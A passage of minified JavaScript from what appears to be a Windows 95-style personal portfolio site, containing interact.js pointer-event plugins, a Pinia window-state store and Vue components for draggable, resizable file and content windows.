                    O = 0;
                  O < b.length;
                  O++
                ) {
                  var J = b[O];
                  (T.node = J), c.fire("pointerEvents:collect-targets", T);
                }
                if (T.targets.length) {
                  for (
                    var N = 1 / 0, H = 0, re = T.targets;
                    H < re.length;
                    H++
                  ) {
                    var ne = re[H].eventable.options.holdDuration;
                    ne < N && (N = ne);
                  }
                  (P.duration = N),
                    (P.timeout = setTimeout(function () {
                      Mn(
                        {
                          interaction: d,
                          eventTarget: m,
                          pointer: h,
                          event: g,
                          type: "hold",
                        },
                        c
                      );
                    }, N));
                }
              })(s, r),
                Mn(s, r);
            },
            "interactions:up": function (s, r) {
              var l, c, d, h, g, m;
              Ps(s),
                Mn(s, r),
                (c = r),
                (d = (l = s).interaction),
                (h = l.pointer),
                (g = l.event),
                (m = l.eventTarget),
                d.pointerWasMoved ||
                  Mn(
                    {
                      interaction: d,
                      eventTarget: m,
                      pointer: h,
                      event: g,
                      type: "tap",
                    },
                    c
                  );
            },
            "interactions:cancel": function (s, r) {
              Ps(s), Mn(s, r);
            },
          },
          PointerEvent: nc,
          fire: Mn,
          collectEventTargets: oc,
          defaults: {
            holdDuration: 600,
            ignoreFrom: null,
            allowFrom: null,
            origin: { x: 0, y: 0 },
          },
          types: {
            down: !0,
            move: !0,
            up: !0,
            cancel: !0,
            tap: !0,
            doubletap: !0,
            hold: !0,
          },
        };
      function Mn(s, r) {
        var l = s.interaction,
          c = s.pointer,
          d = s.event,
          h = s.eventTarget,
          g = s.type,
          m = s.targets,
          A = void 0 === m ? oc(s, r) : m,
          P = new nc(g, c, d, h, l, r.now());
        r.fire("pointerEvents:new", { pointerEvent: P });
        for (
          var b = {
              interaction: l,
              pointer: c,
              event: d,
              eventTarget: h,
              targets: A,
              type: g,
              pointerEvent: P,
            },
            T = 0;
          T < A.length;
          T++
        ) {
          var O = A[T];
          for (var J in O.props || {}) P[J] = O.props[J];
          var N = R(O.eventable, O.node);
          if (
            (P._subtractOrigin(N),
            (P.eventable = O.eventable),
            (P.currentTarget = O.node),
            O.eventable.fire(P),
            P._addOrigin(N),
            P.immediatePropagationStopped ||
              (P.propagationStopped &&
                T + 1 < A.length &&
                A[T + 1].node !== P.currentTarget))
          )
            break;
        }
        if ((r.fire("pointerEvents:fired", b), "tap" === g)) {
          var H = P.double
            ? Mn(
                {
                  interaction: l,
                  pointer: c,
                  event: d,
                  eventTarget: h,
                  type: "doubletap",
                },
                r
              )
            : P;
          (l.prevTap = H), (l.tapTime = H.timeStamp);
        }
        return P;
      }
      function oc(s, r) {
        var l = s.interaction,
          c = s.pointer,
          d = s.event,
          h = s.eventTarget,
          g = s.type,
          m = l.getPointerIndex(c),
          A = l.pointers[m];
        if ("tap" === g && (l.pointerWasMoved || !A || A.downTarget !== h))
          return [];
        for (
          var P = Un(h),
            b = {
              interaction: l,
              pointer: c,
              event: d,
              eventTarget: h,
              type: g,
              path: P,
              targets: [],
              node: null,
            },
            T = 0;
          T < P.length;
          T++
        ) {
          var O = P[T];
          (b.node = O), r.fire("pointerEvents:collect-targets", b);
        }
        return (
          "hold" === g &&
            (b.targets = b.targets.filter(function (J) {
              var N, H;
              return (
                J.eventable.options.holdDuration ===
                (null == (N = l.pointers[m]) || null == (H = N.hold)
                  ? void 0
                  : H.duration)
              );
            })),
          b.targets
        );
      }
      function Ps(s) {
        var r = s.interaction,
          l = s.pointerIndex,
          c = r.pointers[l].hold;
        c && c.timeout && (clearTimeout(c.timeout), (c.timeout = null));
      }
      var yp = Object.freeze({ __proto__: null, default: Qo });
      function wp(s) {
        var r = s.interaction;
        r.holdIntervalHandle &&
          (clearInterval(r.holdIntervalHandle), (r.holdIntervalHandle = null));
      }
      var bp = {
          id: "pointer-events/holdRepeat",
          install: function (s) {
            s.usePlugin(Qo);
            var r = s.pointerEvents;
            (r.defaults.holdRepeatInterval = 0),
              (r.types.holdrepeat = s.actions.phaselessTypes.holdrepeat = !0);
          },
          listeners: ["move", "up", "cancel", "endall"].reduce(
            function (s, r) {
              return (s["pointerEvents:".concat(r)] = wp), s;
            },
            {
              "pointerEvents:new": function (s) {
                var r = s.pointerEvent;
                "hold" === r.type && (r.count = (r.count || 0) + 1);
              },
              "pointerEvents:fired": function (s, r) {
                var l = s.interaction,
                  c = s.pointerEvent,
                  d = s.eventTarget,
                  h = s.targets;
                if ("hold" === c.type && h.length) {
                  var g = h[0].eventable.options.holdRepeatInterval;
                  g <= 0 ||
                    (l.holdIntervalHandle = setTimeout(function () {
                      r.pointerEvents.fire(
                        {
                          interaction: l,
                          eventTarget: d,
                          type: "hold",
                          pointer: c,
                          event: c,
                        },
                        r
                      );
                    }, g));
                }
              },
            }
          ),
        },
        xp = {
          id: "pointer-events/interactableTargets",
          install: function (s) {
            var r = s.Interactable;
            r.prototype.pointerEvents = function (c) {
              return ae(this.events.options, c), this;
            };
            var l = r.prototype._backCompatOption;
            r.prototype._backCompatOption = function (c, d) {
              var h = l.call(this, c, d);
              return h === this && (this.events.options[c] = d), h;
            };
          },
          listeners: {
            "pointerEvents:collect-targets": function (s, r) {
              var l = s.targets,
                c = s.node,
                d = s.type,
                h = s.eventTarget;
              r.interactables.forEachMatch(c, function (g) {
                var m = g.events,
                  A = m.options;
                m.types[d] &&
                  m.types[d].length &&
                  g.testIgnoreAllow(A, c, h) &&
                  l.push({ node: c, eventable: m, props: { interactable: g } });
              });
            },
            "interactable:new": function (s) {
              var r = s.interactable;
              r.events.getRect = function (l) {
                return r.getRect(l);
              };
            },
            "interactable:set": function (s, r) {
              var l = s.interactable,
                c = s.options;
              ae(l.events.options, r.pointerEvents.defaults),
                ae(l.events.options, c.pointerEvents || {});
            },
          },
        },
        Mp = {
          id: "pointer-events",
          install: function (s) {
            s.usePlugin(yp), s.usePlugin(bp), s.usePlugin(xp);
          },
        },
        Tp = {
          id: "reflow",
          install: function (s) {
            var r = s.Interactable;
            (s.actions.phases.reflow = !0),
              (r.prototype.reflow = function (l) {
                return (function (c, d, h) {
                  for (
                    var g = c.getAllElements(),
                      m = h.window.Promise,
                      A = m ? [] : null,
                      P = function () {
                        var T = g[b],
                          O = c.getRect(T);
                        if (!O) return 1;
                        var J,
                          N = zo(h.interactions.list, function (ne) {
                            return (
                              ne.interacting() &&
                              ne.interactable === c &&
                              ne.element === T &&
                              ne.prepared.name === d.name
                            );
                          });
                        if (N)
                          N.move(),
                            A &&
                              (J =
                                N._reflowPromise ||
                                new m(function (ne) {
                                  N._reflowResolve = ne;
                                }));
                        else {
                          var H = _(O),
                            re = {
                              coords: {
                                page: { x: H.x, y: H.y },
                                client: { x: H.x, y: H.y },
                                timeStamp: h.now(),
                              },
                              get page() {
                                return this.coords.page;
                              },
                              get client() {
                                return this.coords.client;
                              },
                              get timeStamp() {
                                return this.coords.timeStamp;
                              },
                              get pageX() {
                                return this.coords.page.x;
                              },
                              get pageY() {
                                return this.coords.page.y;
                              },
                              get clientX() {
                                return this.coords.client.x;
                              },
                              get clientY() {
                                return this.coords.client.y;
                              },
                              get pointerId() {
                                return this.coords.pointerId;
                              },
                              get target() {
                                return this.coords.target;
                              },
                              get type() {
                                return this.coords.type;
                              },
                              get pointerType() {
                                return this.coords.pointerType;
                              },
                              get buttons() {
                                return this.coords.buttons;
                              },
                              preventDefault: function () {},
                            };
                          J = (function (ne, ce, be, ke, ge) {
                            var _e = ne.interactions.new({
                                pointerType: "reflow",
                              }),
                              dt = {
                                interaction: _e,
                                event: ge,
                                pointer: ge,
                                eventTarget: be,
                                phase: "reflow",
                              };
                            (_e.interactable = ce),
                              (_e.element = be),
                              (_e.prevEvent = ge),
                              _e.updatePointer(ge, ge, be, !0),
                              z(_e.coords.delta),
                              fs(_e.prepared, ke),
                              _e._doPhase(dt);
                            var bt = ne.window.Promise,
                              Gt = bt
                                ? new bt(function (on) {
                                    _e._reflowResolve = on;
                                  })
                                : void 0;
                            return (
                              (_e._reflowPromise = Gt),
                              _e.start(ke, ce, be),
                              _e._interacting
                                ? (_e.move(dt), _e.end(ge))
                                : (_e.stop(), _e._reflowResolve()),
                              _e.removePointer(ge, ge),
                              Gt
                            );
                          })(h, c, T, d, re);
                        }
                        A && A.push(J);
                      },
                      b = 0;
                    b < g.length && !P();
                    b++
                  );
                  return (
                    A &&
                    m.all(A).then(function () {
                      return c;
                    })
                  );
                })(this, l, s);
              });
          },
          listeners: {
            "interactions:stop": function (s, r) {
              var c,
                d,
                l = s.interaction;
              "reflow" === l.pointerType &&
                (l._reflowResolve && l._reflowResolve(),
                (c = r.interactions.list),
                (d = l),
                c.splice(c.indexOf(d), 1));
            },
          },
        };
      if (
        (ut.use(Gl),
        ut.use(Jl),
        ut.use(Mp),
        ut.use(Yh),
        ut.use(vp),
        ut.use(Oh),
        ut.use(bh),
        ut.use(xh),
        ut.use(Tp),
        (ut.default = ut),
        "object" === i(e) && e)
      )
        try {
          e.exports = ut;
        } catch {}
      return (ut.default = ut), ut;
    })();
  })(wr, wr.exports);
var eA = wr.exports;
const It = $w(eA),
  Yn = rf("windows", {
    state: () => ({
      activeWindow: "",
      activeWindows: [],
      zIndex: 2,
      windows: [
        {
          windowId: "BiographyWindow",
          windowState: "close",
          displayName: "jrtw.txt",
          windowComponent: "window",
          windowContent: "bio",
          windowContentPadding: {
            top: null,
            right: null,
            bottom: null,
            left: null,
          },
          position: "absolute",
          positionX: "5vw",
          positionY: "5%",
          iconImage: "bio.png",
          altText: "Biography",
          fullscreen: !1,
          showInAppGrid: !0,
          showInNavbar: !0,
        },
        {
          windowId: "AppleWWDC2021",
          windowState: "close",
          displayName: "Music",
          windowComponent: "window",
          windowContent: "wwdc2021",
          windowContentPadding: {
            top: null,
            right: null,
            bottom: null,
            left: null,
          },
          position: "absolute",
          positionX: "4vw",
          positionY: "12vh",
          iconImage: "apple.png",
          altText: "Apple WWDC 2021",
          fullscreen: !1,
          showInAppGrid: !0,
          showInNavbar: !0,
        },

        {
          windowId: "ResumeWindow",
          windowState: "close",
          displayName: "well well well",
          windowComponent: "window",
          windowContent: "resume",
          windowContentPadding: {
            top: "0",
            right: "0",
            bottom: "0",
            left: "0",
          },
          position: "absolute",
          positionX: "10vw",
          positionY: "15vh",
          iconImage: "resume.png",
          altText: "Résumé",
          fullscreen: !1,
          showInAppGrid: !0,
          showInNavbar: !0,
        },
        {
          windowId: "ImagePreviewWindow",
          windowState: "close",
          displayName: "Media Viewer",
          windowComponent: "ImagePreviewWindow",
          windowContent: "",
          windowContentPadding: {
            top: "1px",
            right: "10px",
            bottom: "10px",
            left: "10px",
          },
          position: "absolute",
          positionX: "6vw",
          positionY: "12vh",
          iconImage: "file.png",
          altText: "Photos",
          fullscreen: !1,
          showInAppGrid: !1,
          showInNavbar: !1,
        },

        {
          windowId: "MailWindow",
          windowState: "close",
          displayName: "Mail",
          windowComponent: "mail",
          windowContent: "",
          windowContentPadding: {
            top: "0",
            right: "0",
            bottom: "0",
            left: "0",
          },
          position: "absolute",
          positionX: "6vw",
          positionY: "12vh",
          iconImage: "mail.png",
          altText: "Mail",
          fullscreen: !1,
          showInAppGrid: !0,
          showInNavbar: !0,
        },

        {
          windowId: "PhotosWindow",
          windowState: "close",
          displayName: "Photos",
          windowComponent: "FilesWindow",
          windowContent: "",
          windowContentPadding: {
            top: "0px",
            right: "0px",
            bottom: "0px",
            left: "0px",
          },
          position: "absolute",
          positionX: "5vw",
          positionY: "10vh",
          positionXLarge: "23vw",
          positionYLarge: "7%",
          iconImage: "photos.png",
          altText: "Photos",
          fullscreen: !1,
          showInNavbar: !0,
          folderContent: [
            {
              id: 0,
              title: "photos",
              content: [
                {
                  id: 0,
                  title: "jew-1.PNG",
                  type: "photo",
                  src: "/images/jew1.png",
                  altText: "Q-3.JPG",
                  size: 2477506,
                },
                {
                  id: 1,
                  title: "jew-2.PNG",
                  type: "photo",
                  src: "/images/jew2.png",
                  altText: "Q-2.JPG",
                  size: 1265051,
                },
                {
                  id: 2,
                  title: "jew-3.PNG",
                  type: "photo",
                  src: "/images/jew3.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 3,
                  title: "jew-4.PNG",
                  type: "photo",
                  src: "/images/jew4.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 4,
                  title: "jew-5.PNG",
                  type: "photo",
                  src: "/images/jew5.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 5,
                  title: "jew-6.PNG",
                  type: "photo",
                  src: "/images/jew6.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 6,
                  title: "jew-7.PNG",
                  type: "photo",
                  src: "/images/jew7.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 7,
                  title: "jew-8.PNG",
                  type: "photo",
                  src: "/images/jew8.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 8,
                  title: "jew-9.PNG",
                  type: "photo",
                  src: "/images/jew9.jpeg",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 9,
                  title: "jew-10.PNG",
                  type: "photo",
                  src: "/images/jew10.jpeg",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
                {
                  id: 10,
                  title: "jew-11.PNG",
                  type: "photo",
                  src: "/images/jew11.png",
                  altText: "Q-1.JPG",
                  size: 1366527,
                },
              ],
              size: 5109084,
              type: "folder",
              altText: "Leica Q",
            },
          ],
          folderSize: 3e5,
        },
      ],
    }),
    getters: {
      getFullscreenWindowHeight() {
        let e = "0px";
        return typeof window < "u" && (e = window.innerHeight + "px"), e;
      },
    },
    actions: {
      getWindowById(e) {
        return this.windows.find((t) => t.windowId === e);
      },
      getWindowFullscreen(e) {
        return this.windows.find((t) => t.windowId === e).fullscreen;
      },
      getActiveWindow() {
        return this.activeWindow;
      },
      setActiveWindow(e) {
        this.activeWindow = e;
      },
      setFullscreen(e) {
        this.windows.find((o) => o.windowId === e.windowId).fullscreen =
          e.fullscreen;
      },
      zIndexIncrement(e) {
        this.zIndex++,
          document.getElementById(e) &&
            (document.getElementById(e).style.zIndex = this.zIndex);
      },
      pushActiveWindow(e) {
        this.activeWindows.push(e);
      },
      popActiveWindow(e) {
        const t = this.activeWindows.indexOf(e);
        -1 !== t && this.activeWindows.splice(t, 1);
      },
      pushNewWindow(e) {
        this.windows.push(e);
      },
      setPhotoFolderContent(e) {
        this.photoFolderContent = e;
      },
      setWindowState(e) {
        const n = this.windows.find((i) => i.windowId === e.windowId);
        let o = !1;
        ("open" == n.windowState || "minimize" == n.windowState) && (o = !0),
          "open" == e.windowState
            ? ((n.windowState = e.windowState),
              setTimeout(() => {
                this.zIndexIncrement(e.windowId);
              }, 0),
              setTimeout(() => {
                this.setActiveWindow(e.windowId);
              }, 0),
              0 == o && this.pushActiveWindow(n))
            : "close" == e.windowState
            ? (setTimeout(() => {
                n.windowState = e.windowState;
              }, 0),
              setTimeout(() => {
                this.popActiveWindow(n);
              }, 0),
              setTimeout(() => {
                this.setActiveWindow("nil");
              }, 0))
            : "minimize" == e.windowState
            ? (setTimeout(() => {
                n.windowState = e.windowState;
              }, 0),
              setTimeout(() => {
                this.setActiveWindow("nil");
              }, 0))
            : console.log("Error: windowState not found or invalid");
      },
    },
  }),
  Ot = (e, t) => {
    const n = e.__vccOpts || e;
    for (const [o, i] of t) n[o] = i;
    return n;
  },
  uf = (e) => (Bn("data-v-418e36cf"), (e = e()), Jn(), e),
  tA = ["id"],
  nA = { class: "window-name" },
  oA = ["alt"],
  iA = uf(() =>
    L(
      "span",
      {
        style: {
          height: "2px",
          width: "6px",
          background: "black",
          "margin-top": "8px",
          "margin-right": "2px",
        },
      },
      null,
      -1
    )
  ),
  rA = [iA],
  sA = uf(() =>
    L(
      "span",
      {
        style: {
          height: "8px",
          width: "9px",
          "border-left": "black 1px solid",
          "border-right": "black 1px solid",
          "border-bottom": "black 1px solid",
          "border-top": "black 2px solid",
        },
      },
      null,
      -1
    )
  ),
  aA = [sA],
  lA = { class: "content" },
  cA = Zt(
    '<div class="top-bar-nav" data-v-418e36cf><div class="top-bar-text" data-v-418e36cf><span style="margin-right:12px;" data-v-418e36cf><u data-v-418e36cf>F</u>ile </span><span style="margin-right:12px;" data-v-418e36cf><u data-v-418e36cf>E</u>dit </span><span style="margin-right:12px;" data-v-418e36cf><u data-v-418e36cf>V</u>iew </span><span style="margin-right:12px;" data-v-418e36cf><u data-v-418e36cf>H</u>elp </span></div></div>',
    1
  ),
  uA = ["onClick", "onTouchstart", "onDblclick"],
  dA = ["alt"],
  fA = ["alt"],
  hA = ["alt"],
  pA = ["alt"],
  gA = { class: "border-box" },
  mA = { class: "icon-text" },
  vA = { class: "bottom-bar" },
  yA = { class: "left-bar bar" },
  wA = { class: "right-bar bar" },
  AA = {
    __name: "FileWindow",
    props: {
      windowId: String,
      nameOfWindow: String,
      content_padding_left: { required: !1, type: String, default: "15%" },
      content_padding_right: { required: !1, type: String, default: "15%" },
      content_padding_top: { required: !1, type: String, default: "5%" },
      content_padding_bottom: { required: !1, type: String, default: "5%" },
      folderContent: { required: !0, type: Array, default: () => [] },
      folderSize: { required: !1, type: Number, default: 0 },
    },
    setup(e) {
      const t = e,
        n = Me({ x: 0, y: 0 }),
        o = Me({ x: 0, y: 0 }),
        i = Yn(),
        a = Me({}),
        u = t.nameOfWindow,
        f = Me(0),
        p = Me(0),
        v = Me(""),
        y = Me(null),
        w = Me(t.folderContent),
        x = Me(t.folderSize);
      hn(() => {
        let M = y.value.clientHeight;
        (v.value = M + "px"), console.log(v.value);
      });
      const k = co(() => ({
          height: `${p.value}px`,
          width: `${f.value}px`,
          transform: `translate(${n.value.x}px, ${n.value.y}px)`,
          "--content-padding-left": t.content_padding_left || "15%",
          "--content-padding-right": t.content_padding_right || "15%",
          "--content-padding-top": t.content_padding_top || "5%",
          "--content-padding-bottom": t.content_padding_bottom || "5%",
          "--fullscreen": i.getFullscreenWindowHeight,
        })),
        D = () => {
          i.setActiveWindow(a.value.windowId),
            i.zIndexIncrement(a.value.windowId);
        },
        G = () => {
          if (1 == i.getWindowFullscreen(a.value.windowId)) {
            const M = { fullscreen: !1, windowId: a.value.windowId };
            i.setFullscreen(M),
              (n.value.x = o.value.x),
              (n.value.y = o.value.y);
          } else if (0 == i.getWindowFullscreen(a.value.windowId)) {
            const M = { fullscreen: !0, windowId: a.value.windowId };
            i.setFullscreen(M);
            const U = n.value.x,
              B = n.value.y;
            (o.value.x = U), (o.value.y = B), (n.value.x = 0), (n.value.y = 0);
          }
        },
        q = () => {
          const M = { windowState: "minimize", windowId: a.value.windowId };
          i.setWindowState(M);
        },
        ie = () => {
          const M = { windowState: "close", windowId: a.value.windowId };
          i.setWindowState(M);
        },
        te = (M) => (0 !== M ? (M / 1e6).toFixed(2) + "MB" : ""),
        C = (M, U) => Math.floor(Math.random() * (U - M + 1)) + M,
        I = (M) => {
          if ("folder" == M.type) {
            const U = "FolderWindow" + C(1, 1e6),
              B = {
                windowId: U,
                windowState: "close",
                displayName: M.title,
                windowComponent: "FilesWindow",
                windowContent: "",
                windowContentPadding: {
                  top: "0px",
                  right: "0px",
                  bottom: "0px",
                  left: "0px",
                },
                position: "absolute",
                positionX: C(1, 10) + "vw",
                positionY: C(1, 25) + "vh",
                iconImage: "folder.png",
                altText: M.title,
                fullscreen: !1,
                showInAppGrid: !1,
                showInNavbar: !0,
                folderContent: M.content,
                folderSize: M.size,
              },
              $ = { windowState: "open", windowId: U };
            i.pushNewWindow(B), i.setWindowState($);
          } else if ("video" == M.type) console.log("SKIP");
          else {
            const U = { windowState: "open", windowId: "ImagePreviewWindow" },
              B = w.value.slice(w.value.indexOf(M));
            B.push(...w.value.slice(0, w.value.indexOf(M)));
            const $ = { windowState: "close", windowId: "ImagePreviewWindow" };
            i.setWindowState($),
              setTimeout(() => {
                i.setPhotoFolderContent(B), i.setWindowState(U);
              });
          }
        };
      let W = !1;
      return (
        hn(() => {
          (a.value = i.getWindowById(u)),
            It("#" + a.value.windowId)
              .draggable({
                listeners: {
                  move(U) {
                    (n.value.x += U.dx), (n.value.y += U.dy);
                  },
                },
                modifiers: [
                  It.modifiers.restrictRect({
                    restriction: "#screen",
                    endOnly: !0,
                  }),
                ],
                allowFrom: "#top-bar",
              })
              .on("dragstart", () => {
                W = !0;
              })
              .on("dragmove", () => {
                W && (D(), (W = !1));
              })
              .on("dragend", () => {
                W = !1;
              })
              .resizable({
                edges: { left: !0, right: !0, bottom: !0, top: !1 },
                listeners: {
                  move(U) {
                    const B = U.target;
                    (f.value = U.rect.width),
                      (p.value = U.rect.height),
                      (B.style.width = `${f.value}px`),
                      (B.style.height = `${p.value}px`),
                      (n.value.x += U.deltaRect.left),
                      (n.value.y += U.deltaRect.top);
                  },
                },
                modifiers: [
                  It.modifiers.restrictSize({
                    min: { width: 400, height: 400 },
                    max: {
                      width:
                        document.getElementById("screen").clientWidth -
                        n.value.x,
                      height:
                        document.getElementById("screen").clientHeight -
                        n.value.y,
                    },
                  }),
                ],
              });
        }),
        (M, U) => (
          ve(),
          Ie(
            "div",
            {
              id: a.value.windowId,
              style: Pt(k.value),
              class: gt([
                "window window-style",
                {
                  fullscreen: 1 == a.value.fullscreen,
                  minimize: "minimize" == a.value.fullscreen,
                },
              ]),
              onClick: [D, D],
              onDragstart: D,
            },
            [
              L(
                "div",
                {
                  id: "top-bar",
                  class: gt([
                    "top-bar-window",
                    De(i).activeWindow == a.value.windowId
                      ? "top-bar"
                      : "top-bar-deactivated",
                  ]),
                  onDblclick: G,
                },
                [
                  L("div", nA, [
                    L(
                      "img",
                      { class: "icon-image", src: af, alt: a.value.altText },
                      null,
                      8,
                      oA
                    ),
                    mi(xt(a.value.displayName), 1),
                  ]),
                  L("div", { class: "triple-button" }, [
                    L(
                      "button",
                      { class: "minimize-button button", onClick: q },
                      rA
                    ),
                    L(
                      "button",
                      { class: "expand-button button", onClick: G },
                      aA
                    ),
                    L(
                      "button",
                      {
                        class: "close-button button",
                        style: { "margin-right": "3px", "padding-left": "1px" },
                        onClick: ie,
                      },
                      " × "
                    ),
                  ]),
                ],
                34
              ),
              L("div", lA, [
                cA,
                L(
                  "div",
                  {
                    class: "file-explorer",
                    onClick:
                      U[0] ||
                      (U[0] = Xm((B) => (x.value = e.folderSize), ["self"])),
                    ref_key: "fileExplorer",
                    ref: y,
                  },
                  [
                    L(
                      "nav",
                      {
                        class: "grid-container-photos",
                        style: Pt({ height: v.value }),
                      },
                      [
                        (ve(!0),
                        Ie(
                          ot,
                          null,
                          gi(
                            w.value,
                            (B) => (
                              ve(),
                              Ie("li", { key: B.key }, [
                                L(
                                  "button",
                                  {
                                    class: "icon-photos",
                                    onClick: ($) =>
                                      ((M) => {
                                        x.value = M.size;
                                      })(B),
                                    onTouchstart: ($) => I(B),
                                    onDblclick: ($) => I(B),
                                  },
                                  [
                                    "photo" == B.type
                                      ? (ve(),
                                        Ie(
                                          "img",
                                          {
                                            key: 0,
                                            class: "icon-image-photos",
                                            src: Qw,
                                            alt: B.altText,
                                          },
                                          null,
                                          8,
                                          dA
                                        ))
                                      : "folder" == B.type
                                      ? (ve(),
                                        Ie(
                                          "img",
                                          {
                                            key: 1,
                                            class: "icon-image-photos",
                                            src: Xw,
                                            alt: B.altText,
                                          },
                                          null,
                                          8,
                                          fA
                                        ))
                                      : "file" == B.type
                                      ? (ve(),
                                        Ie(
                                          "img",
                                          {
                                            key: 2,
                                            class: "icon-image-photos",
                                            src: Zw,
                                            alt: B.altText,
                                          },
                                          null,
                                          8,
                                          hA
                                        ))
                                      : "video" == B.type
                                      ? (ve(),
                                        Ie(
                                          "img",
                                          {
                                            key: 3,
                                            class: "icon-image-photos",
                                            src: qw,
                                            alt: B.altText,
                                          },
                                          null,
                                          8,
                                          pA
                                        ))
                                      : so("", !0),
                                    L("div", gA, [L("p", mA, xt(B.title), 1)]),
                                  ],
                                  40,
                                  uA
                                ),
                              ])
                            )
                          ),
                          128
                        )),
                      ],
                      4
                    ),
                  ],
                  512
                ),
                L("div", vA, [
                  L("div", yA, xt(w.value.length) + " object(s)", 1),
                  L("div", wA, xt(te(x.value)), 1),
                ]),
              ]),
            ],
            46,
            tA
          )
        )
      );
    },
  },
  bA = Ot(AA, [["__scopeId", "data-v-418e36cf"]]),
  df = (e) => (Bn("data-v-33fd31e2"), (e = e()), Jn(), e),
  _A = ["id"],
  xA = { class: "window-name" },
  PA = ["src", "alt"],
  MA = df(() =>
    L(
      "span",
      {
        style: {
          height: "2px",
          width: "6px",
          background: "black",
          "margin-top": "8px",
          "margin-right": "2px",
        },
      },
      null,
      -1
    )
  ),
  SA = [MA],
  TA = df(() =>
    L(
      "span",
      {
        style: {
          height: "8px",
          width: "9px",
          "border-left": "black 1px solid",
          "border-right": "black 1px solid",
          "border-bottom": "black 1px solid",
          "border-top": "black 2px solid",
        },
      },
      null,
      -1
    )
  ),
  kA = [TA],
  EA = { class: "content" },
  DA = {
    __name: "Window",
    props: {
      windowId: String,
      nameOfWindow: String,
      content_padding_left: { required: !1, type: String, default: "15%" },
      content_padding_right: { required: !1, type: String, default: "15%" },
      content_padding_top: { required: !1, type: String, default: "5%" },
      content_padding_bottom: { required: !1, type: String, default: "5%" },
    },
    setup(e) {
      const t = e,
        n = Me({ x: 0, y: 0 }),
        o = Me({ x: 0, y: 0 }),
        i = Yn(),
        a = Me({}),
        u = t.nameOfWindow,
        f = Me(400),
        p = Me(400),
        v = co(() => ({
          height: `${p.value}px`,
          width: `${f.value}px`,
          transform: `translate(${n.value.x}px, ${n.value.y}px)`,
          "--content-padding-left": t.content_padding_left || "15%",
          "--content-padding-right": t.content_padding_right || "15%",
          "--content-padding-top": t.content_padding_top || "5%",
          "--content-padding-bottom": t.content_padding_bottom || "5%",
          "--fullscreen": i.getFullscreenWindowHeight,
        })),
        y = () => {
          i.setActiveWindow(a.value.windowId),
            i.zIndexIncrement(a.value.windowId);
        },
        w = () => {
          if (1 == i.getWindowFullscreen(a.value.windowId)) {
            const q = { fullscreen: !1, windowId: a.value.windowId };
            i.setFullscreen(q),
              (n.value.x = o.value.x),
              (n.value.y = o.value.y);
          } else if (0 == i.getWindowFullscreen(a.value.windowId)) {
            const q = { fullscreen: !0, windowId: a.value.windowId };
            i.setFullscreen(q);
            const ie = n.value.x,
              te = n.value.y;
            (o.value.x = ie),
              (o.value.y = te),
              (n.value.x = 0),
              (n.value.y = 0);
          }
        },
        x = () => {
          const q = { windowState: "minimize", windowId: a.value.windowId };
          i.setActiveWindow(""), i.setWindowState(q);
        },
        k = () => {
          const q = { windowState: "close", windowId: a.value.windowId };
          i.setWindowState(q);
        },
        D = (q) => {
          const ie = `../assets/win95Icons/${q}`,
            E = Object.assign({
              "../assets/win95Icons/apple.png": jr,
              "../assets/win95Icons/apple2.png": Nr,
              "../assets/win95Icons/apple3.png": Br,
              "../assets/win95Icons/bio.png": Jr,
              "../assets/win95Icons/file.png": zr,
              "../assets/win95Icons/folder.png": Yr,
              "../assets/win95Icons/mail.png": Ur,
              "../assets/win95Icons/noss.webp": Hr,
              "../assets/win95Icons/photos.png": Vr,
              "../assets/win95Icons/resume.png": Qr,
            })[ie];
          return null == E ? "" : E.default;
        };
      let G = !1;
      return (
        hn(() => {
          (a.value = i.getWindowById(u)),
            It("#" + a.value.windowId)
              .draggable({
                listeners: {
                  move(ie) {
                    (n.value.x += ie.dx), (n.value.y += ie.dy);
                  },
                },
                modifiers: [
                  It.modifiers.restrictRect({
                    restriction: "#screen",
                    endOnly: !0,
                  }),
                ],
                allowFrom: "#top-bar",
              })
              .on("dragstart", () => {
                G = !0;
              })
              .on("dragmove", () => {
                G && (y(), (G = !1));
              })
              .on("dragend", () => {
                G = !1;
              })
              .resizable({
                edges: { left: !0, right: !0, bottom: !0, top: !1 },
                listeners: {
                  move(ie) {
                    const te = ie.target;
                    (f.value = ie.rect.width),
                      (p.value = ie.rect.height),
                      (te.style.width = `${f.value}px`),
                      (te.style.height = `${p.value}px`),
                      (n.value.x += ie.deltaRect.left),
                      (n.value.y += ie.deltaRect.top);
                  },
                },
                modifiers: [
                  It.modifiers.restrictSize({
                    min: { width: 400, height: 400 },
                    max: {
                      width:
                        document.getElementById("screen").clientWidth -
                        n.value.x,
                      height:
                        document.getElementById("screen").clientHeight -
                        n.value.y,
                    },
                  }),
                ],
              });
        }),
        (q, ie) => (
          ve(),
          Ie(
            "div",
            {
              id: a.value.windowId,
              style: Pt(v.value),
              class: gt([
                "window window-style",
                {
                  fullscreen: 1 == a.value.fullscreen,
                  minimize: "minimize" == a.value.fullscreen,
                },
              ]),
              onClick: [y, y],
              onDragstart: y,
            },
            [
              L(
                "div",
                {
                  id: "top-bar",
                  class: gt([
                    "top-bar-window",
                    De(i).activeWindow == a.value.windowId
                      ? "top-bar"
                      : "top-bar-deactivated",
                  ]),
                  onDblclick: w,
                },
                [
                  L("div", xA, [
                    L(
                      "img",
                      {
                        class: "icon-image",
                        src: D(a.value.iconImage),
                        alt: a.value.altText,
                      },
                      null,
                      8,
                      PA
                    ),
                    mi(xt(a.value.displayName), 1),
                  ]),
                  L("div", { class: "triple-button" }, [
                    L(
                      "button",
                      { class: "minimize-button button", onClick: x },
                      SA
                    ),
                    L(
                      "button",
                      { class: "expand-button button", onClick: w },
                      kA
                    ),
                    L(
                      "button",
                      {
                        class: "close-button button",
                        style: { "margin-right": "3px", "padding-left": "1px" },
                        onClick: k,
                      },
                      " × "
                    ),
                  ]),
                ],
                34
              ),
              L("div", EA, [
                Ug(
                  q.$slots,
                  "content",
                  { class: "window-content" },
                  void 0,
                  !0
                ),
              ]),
            ],
            46,
            _A
          )
        )
      );
    },
  },
  IA = Ot(DA, [["__scopeId", "data-v-33fd31e2"]]),
  OA =
